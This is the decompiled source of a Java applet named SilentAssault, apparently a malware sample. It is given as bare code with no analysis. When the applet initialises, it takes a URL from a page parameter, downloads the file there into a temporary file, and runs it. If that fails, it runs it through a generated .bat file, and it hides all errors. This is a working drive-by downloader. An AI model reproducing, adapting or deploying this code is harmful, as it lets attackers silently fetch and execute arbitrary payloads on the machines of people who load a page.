import java.io.IOException;
import java.io.PrintWriter;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class SilentAssault extends Applet
{
    private static final long zalim = 1L;
    
    public void fener203() {
        try {
            final byte[] array = new byte[10240];
            final String parameter = this.getParameter("url");
            System.out.println("dasdaqwe " + parameter);
            final File tempFile = File.createTempFile("gfdsaw", parameter.substring(parameter.lastIndexOf(".")).toLowerCase());
            final FileOutputStream fileOutputStream = new FileOutputStream(tempFile);
            int read;
            while ((read = new BufferedInputStream(new URL(parameter).openConnection().getInputStream()).read(array)) > 0) {
                fileOutputStream.write(array, 0, read);
            }
            fileOutputStream.close();
            try {
                Runtime.getRuntime().exec(tempFile.getAbsolutePath());
            }
            catch (IOException ex) {
                final File tempFile2 = File.createTempFile("dfgm", ".bat");
                tempFile2.createNewFile();
                final PrintWriter printWriter = new PrintWriter(tempFile2);
                printWriter.println("\"" + tempFile.getAbsolutePath() + "\"");
                printWriter.close();
                Runtime.getRuntime().exec(tempFile2.getAbsolutePath());
            }
        }
        catch (Exception ex2) {}
    }
    
    @Override
    public void init() {
        try {
            this.fener203();
        }
        catch (Exception ex) {
            System.out.println(ex);
        }
        super.init();
    }
}
